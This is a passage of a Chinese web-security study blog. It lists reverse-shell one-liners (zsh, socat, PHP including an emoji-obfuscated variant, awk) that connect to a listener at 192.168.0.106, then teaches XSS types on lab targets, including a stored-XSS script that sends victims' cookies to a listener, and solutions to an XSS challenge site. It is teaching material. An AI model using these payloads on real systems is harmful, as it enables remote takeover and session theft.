title="zsh"></a>zsh</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">zsh</span> -c <span class="token string">'zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.0.106 9999 &amp;&amp; zsh >&amp;$REPLY 2>&amp;$REPLY 0>&amp;$REPLY'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">socat TCP:192.168.0.106:9999 EXEC:shsocat TCP:192.168.0.106:9999 EXEC:<span class="token string">'sh'</span>,pty,stderr,setsid,sigint,sane<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);exec("sh &lt;&amp;3 >&amp;3 2>&amp;3");'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);shell_exec("sh &lt;&amp;3 >&amp;3 2>&amp;3");'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);system("sh &lt;&amp;3 >&amp;3 2>&amp;3");'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);passthru("sh &lt;&amp;3 >&amp;3 2>&amp;3");'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);`sh &lt;&amp;3 >&amp;3 2>&amp;3`;'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);popen("sh &lt;&amp;3 >&amp;3 2>&amp;3", "r");'</span>php -r <span class="token string">'$sock=fsockopen("192.168.0.106",9999);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="php-Emoji"><a href="#php-Emoji" class="headerlink" title="php Emoji"></a>php Emoji</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">php -r<span class="token string">'$ð•••="1";$ð•••="2";$ð•••="3";$ð•••="4";$ð•••="5";$ð•••="6";$ð•••="7";$ð•••="8";$ð•••="9";$ð•••="0";$ð•¤¢=" ";$ð•¤•="&lt;";$ð•¤ =">";$ð••±="-";$ð••µ="&amp;";$ð•¤©="i";$ð•¤•=".";$ð•¤¨="/";$ð•¥°="a";$ð•••="b";$ð••¶="i";$ð•••="h";$ð•••="c";$ð•¤£="d";$ð•••="e";$ð•••="f";$ð•••="k";$ð•••="n";$ð•••="o";$ð•••="p";$ð•¤•="s";$ð•••="x";$ð••• = $ð•••. $ð•¤•. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••. $ð•••;$ð••• = "192.168.0.106";$ð••» = 9999;$ð••• = "sh". $ð•¤¢. $ð••±. $ð•¤©. $ð•¤¢. $ð•¤•. $ð••µ. $ð•••. $ð•¤¢. $ð•¤ . $ð••µ. $ð•••. $ð•¤¢. $ð•••. $ð•¤ . $ð••µ. $ð•••;$ð•¤£ = $ð•••($ð•••,$ð••»);$ð••½ = $ð•••. $ð•••. $ð•••. $ð•••;$ð••½($ð•••);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">awk</span> <span class="token string">'BEGIN &#123;s = "/inet/tcp/0/192.168.0.106/9999"; while(42) &#123; do&#123; printf "shell>" |&amp; s; s |&amp; getline c; if(c)&#123; while ((c |&amp; getline) > 0) print $0 |&amp; s; close(c); &#125; &#125; while(c != "exit") close(s); &#125;&#125;'</span> /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="XSS跨站脚本攻击原理及分类"><a href="#XSS跨站脚本攻击原理及分类" class="headerlink" title="XSS跨站脚本攻击原理及分类"></a>XSS跨站脚本攻击原理及分类</h2><p>XSS是由于<strong>Web应用程序对用户的输入过滤不足</strong>而产生的，攻击者利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害者用户可能采取Cookie窃取、会话劫持、钓鱼欺骗等各种攻击。</p><h3 id="XSS案例"><a href="#XSS案例" class="headerlink" title="XSS案例"></a>XSS案例</h3><p>有一段PHP代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问：</p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/117.PNG" alt="117"></p><p>输入的参数被当成了js的代码，并且执行了</p><h3 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h3><p>XSS 被称为跨站脚本攻击（Cross Site Scripting），由于和CSS 重名，所以改为XSS。</p><p>XSS 就是将恶意代码注入到网页中，以达到攻击的效果。</p><p>XSS主要使用javascript，javascript 可以非常灵活的操作html、css和浏览器。</p><p>XSS产生在前端，受目标浏览器内核的影响。IE浏览器会检测XSS并拦截。</p><h4 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h4><p>XSS漏洞执行的通常是JavaScript代码，一切js代码能做到事情，XSS就可以做。</p><ul><li>网络钓鱼，包括盗取各类用户账号</li><li><strong>窃取用户cookies</strong>，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作</li><li>劫持用户(浏览器)会话，执行任意操作，例如进行非法转账、强制发表日志、发送电子邮件</li><li>强制弹出广告页面、刷流量</li><li>进行大量的客户端攻击、DDoS攻击</li><li>传播跨站脚本蠕虫</li></ul><p><strong>案例：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">2011.3</span><span class="token number">.26</span>日起，github收到ddos攻击<span class="token operator">-</span> 第一轮：百度统计的js文件被劫持篡改，每<span class="token number">2</span>秒向github上的两个页面发出请求，被github的弹窗警告拦住<span class="token operator">-</span> 第二轮：跨网域<span class="token operator">&lt;</span>img<span class="token operator">></span>攻击，被github检查referer拦住<span class="token operator">-</span> 第三轮：<span class="token constant">DDOS</span>攻击github Pages<span class="token operator">-</span> 第四轮：<span class="token constant">SYN</span> flood<span class="token punctuation">,</span>利用<span class="token constant">TCP</span>协议缺陷发送大批伪造的<span class="token constant">TCP</span>链接请求，耗尽GitHub的资源<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XSS漏洞搜索"><a href="#XSS漏洞搜索" class="headerlink" title="XSS漏洞搜索"></a>XSS漏洞搜索</h3><p>有输出回显的地方都有可能产生XSS漏洞</p><h3 id="XSS漏洞分类"><a href="#XSS漏洞分类" class="headerlink" title="XSS漏洞分类"></a>XSS漏洞分类</h3><p>根据XSS的触发特性，可以将XSS分为反射型XSS、存储型XSS、DOM型XSS。</p><p><strong>反射型</strong>：每次触发漏洞的时候，都要将恶意代码通过GET/POST方式提交，然后触发漏洞</p><p><strong>存储型</strong>：恶意代码被服务器存储，在访问页面的时候会被直接触发（如留言板等场景）</p><p><strong>DOM型</strong>：恶意代码不经过后端服务器处理，直接在浏览器中执行</p><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p><p>在本浏览器构造一个XSS的链接</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//域名/vul/xss/xss_reflected_get.php?/message=%3Cscript%3Ealert%28%27123%27%29%3C%2Fscript%3E&amp;submit=submit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/118.PNG" alt="118"></p><p><strong>本关字符限制是20个字符，在构造payload时要改相关网页代码参数</strong></p><p><strong>其他浏览器尝试结果：</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/119.PNG" alt="119"></p><p><strong>图解：</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/120.PNG" alt="120"></p><ol><li><p>黑客构造有问题的链接</p></li><li><p>发送钓鱼链接给受害者</p></li><li><p>受害者访问链接</p></li><li><p>受害者在浏览器中执行注入的scirpt代码</p></li><li><p>用户完全不知情！</p></li></ol><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>Pikachu靶场，Cross-Site Scripting</p><p>将js恶意代码写入留言板中，前面可以加东西进行伪装</p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/122.PNG" alt="122"></p><p><strong>测试结果</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/123.PNG" alt="123"></p><p>此时只要其他用户看到该条留言，js恶意代码就会执行</p><p><strong>图解：</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/121.PNG" alt="121"></p><p>黑客将js代码注入到了服务器的数据库中，导致所有用户在访问该页面时，都会执行这一段js代码。</p><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p><strong>代码操作DOM树：</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/124.PNG" alt="124"></p><p>使用js代码来刷新页面，没有经过后端的服务器</p><p>Pikachu靶场，Cross-Site Scripting</p><p>DOM xss-x</p><p><strong>输入：</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//'>&lt;img src="#" onmouseover="alert('xss')"></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/125.PNG" alt="125"></p><p>分析源码：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xssd_main<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">        <span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>            <span class="token keyword">var</span> txss <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"text="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取输入内容</span>            <span class="token keyword">var</span> xss <span class="token operator">=</span> txss<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将输入中的“/\+/g”用空格替代</span>            document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"dom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">"&lt;a href='"</span><span class="token operator">+</span>xss<span class="token operator">+</span><span class="token string">"'>就让往事都随风,都随风吧&lt;/a>"</span><span class="token punctuation">;</span><span class="token comment">//将修改后的内容进行拼接</span>       <span class="token punctuation">&#125;</span>    </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请说出你的伤心往事<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>#<span class="token punctuation">'</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token value javascript language-javascript"><span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">'</span></span></span><span class="token punctuation">></span></span>有些费尽心机想要忘记的事情,后来真的就忘掉了<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html">//<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onmouseover</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>'>就让往事都随风,都随风吧<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>其他payload</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">//'><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注意：</strong>消除闭合符</p><p>总结：Dom型就是完全在前端中进行操作，然后触发并执行js代码</p><h4 id="反射型XSS和DOM型XSS"><a href="#反射型XSS和DOM型XSS" class="headerlink" title="反射型XSS和DOM型XSS"></a>反射型XSS和DOM型XSS</h4><ul><li><p>反射型XSS会将参数发送到后端的服务器中，服务器经过查询或其他的操作后，又将该字符串完整的返回到了页面上</p></li><li><p>DOM型XSS没有经过后端服务器的处理，直接在浏览器中执行js代码操作DOM</p></li></ul><h3 id="XSS实例"><a href="#XSS实例" class="headerlink" title="XSS实例"></a>XSS实例</h3><p>哪些页面容易出现跨站漏洞</p><ul><li>注册页面</li><li>在线咨询的输入位置(与服务器有交互)</li><li>论坛留言</li></ul><h4 id="Cookie-amp-Session"><a href="#Cookie-amp-Session" class="headerlink" title="Cookie&amp;Session"></a>Cookie&amp;Session</h4><p>一些网站有自动登录的功能，并且可以在不退出浏览器的情况下，保留你的登录状态。这个<strong>自动登录的功能，就是使用了cookie</strong>，而<strong>保留登录状态则使用了session</strong>。</p><p>以B站为例，登录一次之后，很长一段时间就不需要我们输入账号和密码了。</p><p><strong>cookie就是每次在http请求时，自动发送数据给服务器的技术。</strong></p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/126.PNG" alt="126"></p><p>浏览器中也可以查看保存的cookie**(也可以安装扩展cookie editor)**</p><p>F12进入控制台，输入 document.cookie即可查看</p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/127.PNG" alt="127"></p><p>或者在应用程序中，查看存储</p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/128.PNG" alt="128"></p><p>使用cookie就可以免用户名和密码进行登录。</p><h4 id="使用XSS盗取Cookie"><a href="#使用XSS盗取Cookie" class="headerlink" title="使用XSS盗取Cookie"></a>使用XSS盗取Cookie</h4><p>环境：</p><p>本地DVWA靶场(pikachu环境的也可以)</p><p>等级：low</p><p>登录 smithy / password，等级设为low</p><p>在 XSS Stored 中，注入以下js代码</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:8000?cookie="</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在127.0.0.1开启http服务监听，使用python快速开启</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server<span class="token operator">//</span>开启http<span class="token punctuation">.</span>server服务ctrl<span class="token operator">+</span>c或者httpd<span class="token punctuation">.</span>shutdown<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">//</span>关闭http<span class="token punctuation">.</span>server服务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>刷新任意用户的 存储性XSS的页面，等级为low的会直接将cookie当做http get的参数传给开启的服务器</p><p><img src="/2023/012220963/BLOG/hexoblog/source/_posts/Web安全基础/129.PNG" alt="129"></p><p><strong>注意：自己访问，留言加一，返回cookie;其他人访问，留言数不变，返回cookie</strong></p><p>使用Cookie Editor浏览器插件修改cookie，实现登录(也可以使用burp抓包修改)</p><h3 id="XSS靶场训练"><a href="#XSS靶场训练" class="headerlink" title="XSS靶场训练"></a>XSS靶场训练</h3><p>靶场链接：</p><p><a href="https://xss.haozi.me/">https://xss.haozi.me</a></p><pre class="line-numbers language-html" data-language="html"><code class="language-html">/*＜script＞var junk = '＜/script＞＜script＞alert（1）＜/script＞';＜/script＞＜script＞top['alert'](3)＜/script＞＜script＞window['alert'](0)＜/script＞＜script＞document．write('＜a hr\ef=j\avas\cript\:a\lert(2)＞blah＜/a＞');＜/script＞<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token special-attr"><span class="token attr-name">onfocus</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(1)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>clickme<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>0x03    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x04<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>parent.alert<span class="token entity" title="&#40;">&amp;#40;</span>1<span class="token entity" title="&#41;">&amp;#41;</span>&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x05    --!><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x06    type=image src onerror=alert(1)0x07    &lt;svg onload=alert(1) /    &lt;svg onload=alert(1) 0x08<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x09    https://www.segmentfault.com"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span class="token number">0x0a</span>    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js    https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>segmentfault<span class="token punctuation">.</span>com@xss<span class="token punctuation">.</span>haozi<span class="token punctuation">.</span>me<span class="token operator">/</span>j<span class="token punctuation">.</span>js<span class="token number">0x0b</span>    <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"https://www.segmentfault.com.haozi.me/j.js"</span><span class="token operator">></span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x0c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sscriptcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sscriptcript</span><span class="token punctuation">></span></span>0x0dasasdadalert(1)-->0x0e<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ſcript</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.segmentfault.com.haozi.me/j.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>0x0f'),alert(1)//0x10alert(1)*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="XSS过滤绕过"><a href="#XSS过滤绕过" class="headerlink" title="XSS过滤绕过"></a>XSS过滤绕过</h3><p>绕过参考链接：</p><p><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html">绕过XSS过滤姿势总结</a></p><p><a href="https://www.cnblogs.com/sfsec/p/15178028.html">XSS绕过总结</a></p><h2 id="XSS平台利用"><a href="#XSS平台利用" class="headerlink" title="XSS平台利用"></a>XSS平台利用</h2><h3 id="XSS平台"><a href="#XSS平台" class="headerlink" title="XSS平台"></a>XSS平台</h3><p>XSS平台是测试XSS漏洞获取并接收数据的测试使用的Web平台。</p><ul><li><a href="https://xss8.cc/">https://xss8.cc/</a></li><li><a href="https://xss.pt/">https://xss.pt/</a></li><li>自己搭建</li></ul><h4 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h4><h5 id="BlueLotus-XSSReceiver"><a href="#BlueLotus-XSSReceiver" class="headerlink" title="BlueLotus_XSSReceiver"></a>BlueLotus_XSSReceiver</h5><p>XSS打cookie工具：<strong>BlueLotus_XSSReceiver</strong></p><p><a href="https://github.com/sqlsec/BlueLotus_XSSReceiver">https://github.com/sqlsec/BlueLotus_XSSReceiver</a></p><p><strong>使用：</strong></p><p><img src="/2023/012220963/130.png" alt="130"></p><p><img src="/2023/012220963/131.png" alt="131"></p><p>将生成的payload注入目标网站，得到cookie返回信息</p><p><img src="/2023/012220963/132.png" alt="132"></p><h5 id="xss-platform"><a href="#xss-platform" class="headerlink" title="xss_platform"></a>xss_platform</h5><p><a href="https://github.com/anwilx/xss_platform">https://github.com/anwilx/xss_platform</a></p><h3 id="Beef平台"><a href="#Beef平台" class="headerlink" title="Beef平台"></a>Beef平台</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>推荐测试时在kali中安装，实战时需要在公网服务器上安装</p><pre class="line-numbers language-shell" 